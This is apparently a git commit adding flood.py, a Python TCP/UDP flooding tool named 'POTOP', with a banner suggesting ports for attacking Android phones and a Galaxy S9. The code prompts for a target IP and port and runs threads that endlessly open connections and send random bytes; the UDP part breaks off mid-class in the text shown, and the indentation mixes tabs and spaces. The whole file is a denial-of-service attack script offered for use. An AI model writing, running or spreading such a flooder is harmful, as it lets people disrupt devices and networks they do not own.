df9d8c62a29a43d490f4516b001e8025559f98fb
xXSlothaiXx <47003619+xXSlothaiXx@users.noreply.github.com>
2020-02-04 10:43:40 -0500

    Fixed tabs

---
+++ flood.py
@@ -0,0 +1,51 @@
+
+import socket
+import random
+from threading import Thread
+import threading
+import bcolors
+import pyfiglet
+
+ascii_banner = pyfiglet.figlet_format("POTOP")
+print(bcolors.BOLD + bcolors.HEADER + ascii_banner)
+print("TCP/UDP Flooder made by: xxSlothAIxx")
+print("=======================================================")
+print(bcolors.BOLD + "PORT OPTIONS")
+print("Port 6 for Android devices")
+print("Port 80 for http on local network")
+print("Port 0-65535 for galaxy s9")
+print("=======================================================")
+print("\n")
+
+data = random._urandom(16)
+bytes = random._urandom(16)
+
+ip = raw_input("Enter your ip: ")
+port = raw_input("Enter PORT:")
+
+socket_threads = []
+udp_threads = []
+
+class SocketThread(Thread):
+
+
+    def __init__(self, ip, port):
+	Thread.__init__(self)
+	self.ip = ip
+	self.port = port
+
+    def run(self):
+	while True:
+	    try:
+	        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+		server.connect((ip, int(port)))
+		for x in range(0, 1000):
+		    server.send(data)
+	    except:
+		continue
+
+class UDPThread(Thread):
+
+    def __init__(self, ip, port):
+	Thread.__init__(self)
+	self.ip = ip
